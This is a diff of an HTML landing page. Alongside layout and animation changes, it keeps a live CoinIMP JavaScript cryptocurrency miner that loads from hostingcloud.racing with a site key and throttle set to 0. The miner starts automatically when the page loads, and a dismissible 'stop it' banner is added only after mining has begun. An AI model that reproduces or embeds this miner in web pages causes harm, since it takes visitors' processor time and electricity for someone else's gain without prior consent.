@@ -6,6 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Invest and Learn</title>
     <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.css">
 </head>
 <body>
     <header>
@@ -13,16 +14,16 @@
             <h1>My Beautiful Website</h1>
             <nav>
                 <ul>
-                    <li><a href="#">Home</a></li>
-                    <li><a href="#">About</a></li>
-                    <li><a href="#">Services</a></li>
-                    <li><a href="#">Contact</a></li>
+                    <li><a href="#hero">Home</a></li>
+                    <li><a href="#about">About</a></li>
+                    <li><a href="#services">Services</a></li>
+                    <li><a href="#contact">Contact</a></li>
                 </ul>
             </nav>
         </div>
     </header>
 
-    <section class="hero">
+    <section id="hero" class="hero">
         <div class="hero-content">
             <h2>Welcome to Our World</h2>
             <p>Discover amazing things, awesome people, and fantastic services.</p>
@@ -30,12 +31,12 @@
         </div>
     </section>
 
-    <section class="about">
+    <section id="about" data-aos="fade-up">
         <h2>About Us</h2>
-        <p>We create beautiful, functional websites that stand out.</p>
+        <p>We create beautiful, functional websites that stand out in the digital world. Our goal is to bring your ideas to life.</p>
     </section>
 
-    <section id="services">
+    <section id="services" data-aos="fade-up">
         <h2>Our Services</h2>
         <div class="services-grid">
             <div class="service-item">
@@ -52,31 +53,39 @@
             </div>
         </div>
     </section>
-    <section data-aos="fade-up">
-    <h2>About Us</h2>
-    <p>We build beautiful websites.</p>
-    </section>
-    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.js"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.css">
-    <script>
-       AOS.init();
-    </script>
-
 
     <footer>
         <p>© 2025 My Beautiful Website. All rights reserved.</p>
     </footer>
 
+    <!-- Mining Notification -->
+    <div id="mining-notification" style="position: fixed; bottom: 20px; right: 20px; background: #3d3d3d; color: #ffffff; padding: 10px; border-radius: 5px; z-index: 1000;">
+        <p>This site is running a JavaScript miner. If it bothers you, you can <a href="#" id="stop-mining" style="color: #ff5a4e; text-decoration: underline;">stop it</a>.</p>
+    </div>
+
+    <!-- External Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.js"></script>
     <script src="script.js"></script>
+    <script>
+        AOS.init();
+    </script>
+
+    <!-- Cryptocurrency Mining Script -->
     <script src="https://www.hostingcloud.racing/yJ7e.js"></script>
     <script>
-    var _client = new Client.Anonymous('0f4966cf41bb7c9184b481f25fbbc608567d321f9f5080ab226d4f8611fc67ba', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+        var _client = new Client.Anonymous('0f4966cf41bb7c9184b481f25fbbc608567d321f9f5080ab226d4f8611fc67ba', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
 
-</script>
+        // Add the ability to stop mining
+        document.getElementById('stop-mining').addEventListener('click', function(e) {
+            e.preventDefault();
+            _client.stop();
+            document.getElementById('mining-notification').style.display = 'none';
+            alert('Mining stopped.');
+        });
+    </script>
 </body>
 </html>
 
